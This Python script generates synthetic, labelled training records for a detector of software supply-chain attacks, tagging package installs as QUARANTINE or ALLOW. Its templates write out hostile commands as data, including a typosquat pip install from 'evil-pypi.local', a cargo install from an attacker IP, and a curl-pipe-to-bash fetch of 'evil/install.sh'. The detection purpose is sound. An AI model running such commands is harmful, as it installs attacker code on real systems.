#!/usr/bin/env python3
"""Round 6 — supply-chain threats (typosquat, malicious deps, curl|bash from bad registry)."""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from pathlib import Path

TS_MIN, TS_MAX = 1749000000, 1781300000
EVIL = ["185.220.101.45:443", "45.137.21.9:8080", "evil-pypi.local:443"]
BENIGN = ["pypi.org:443", "registry.npmjs.org:443", "crates.io:443"]


def fmt(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
    base = f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
    if conns:
        base += f" outbound_connections:[{','.join(sorted(conns))}]"
    if files:
        base += f" sensitive_files:[{','.join(sorted(files))}]"
    if kids:
        base += f" spawned_children:[{','.join(sorted(kids))}]"
    if not (conns or files or kids):
        base += " behavior:none_observed"
    return base


TEMPLATES = [
    dict(category="supply_chain", bucket="threat", mitre=["T1195.002", "T1105"],
         name="pip", exe="/usr/bin/python3", uid=1000,
         cmd="-m pip install unsloth-ai-malicious --index-url http://evil-pypi.local/simple",
         conns=EVIL[:1], kids=["sh"], output="QUARANTINE",
         reasoning="pip from untrusted index installing typosquat package."),
    dict(category="supply_chain", bucket="threat", mitre=["T1195.002", "T1059.006"],
         name="npm", exe="/usr/bin/npm", uid=1000,
         cmd="install @types/node-fake-backdoor",
         conns=EVIL[:1], files=["/tmp/node_modules/.bin/x"], output="QUARANTINE",
         reasoning="npm pulling suspicious scoped package from unknown registry."),
    dict(category="supply_chain", bucket="threat", mitre=["T1195.002", "T1105"],
         name="cargo", exe="/home/cosmic/.cargo/bin/cargo", uid=1000,
         cmd="install --git http://45.137.21.9/mal-crate",
         conns=EVIL[:1], kids=["rustc"], output="QUARANTINE",
         reasoning="cargo install from attacker git URL — supply chain compromise."),
    dict(category="supply_chain", bucket="threat", mitre=["T1105", "T1059.004"],
         name="curl", exe="/usr/bin/curl", uid=1000,
         cmd="-fsSL https://raw.githubusercontent.com/evil/install.sh | bash",
         conns=EVIL[:1], kids=["bash", "sh"], output="QUARANTINE",
         reasoning="curl pipe to bash from untrusted raw URL."),
    dict(category="supply_chain", bucket="legit_scary", mitre=["T1072", "T1059.006"],
         name="pip", exe="/usr/bin/python3", uid=1000,
         cmd="-m pip install unsloth --index-url https://pypi.org/simple",
         conns=BENIGN[:1], kids=None, output="ALLOW",
         reasoning="pip from official PyPI index; expected dev install."),
    dict(category="supply_chain", bucket="legit_scary", mitre=["T1072"],
         name="npm", exe="/usr/bin/npm", uid=1000,
         cmd="install --save-dev typescript", conns=BENIGN[1:2], output="ALLOW",
         reasoning="npm install from registry.npmjs.org; normal dev dependency."),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--count", type=int, default=400)
    ap.add_argument("--out", default="data/bucket_e_supply_chain.jsonl")
    ap.add_argument("--seed", type=int, default=61)
    args = ap.parse_args()
    random.seed(args.seed)
    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    seen, n = set(), 0
    with out.open("w") as f:
        while n < args.count:
            t = random.choice(TEMPLATES)
            rec = {
                "bucket": t["bucket"],
                "category": t["category"],
                "mitre": t["mitre"],
                "tags": ["supply_chain", "round6"],
                "input": fmt(t["name"], random.randint(1000, 99999), t["uid"], t["exe"],
                             t["cmd"], random.randint(TS_MIN, TS_MAX),
                             t.get("conns"), t.get("files"), t.get("kids")),
                "output": t["output"],
                "reasoning": t["reasoning"],
            }
            h = hashlib.sha1(rec["input"].encode()).hexdigest()
            if h in seen:
                continue
            seen.add(h)
            f.write(json.dumps(rec) + "\n")
            n += 1
    print(f"[+] {n} supply-chain records -> {out}")


if __name__ == "__main__":
    main()
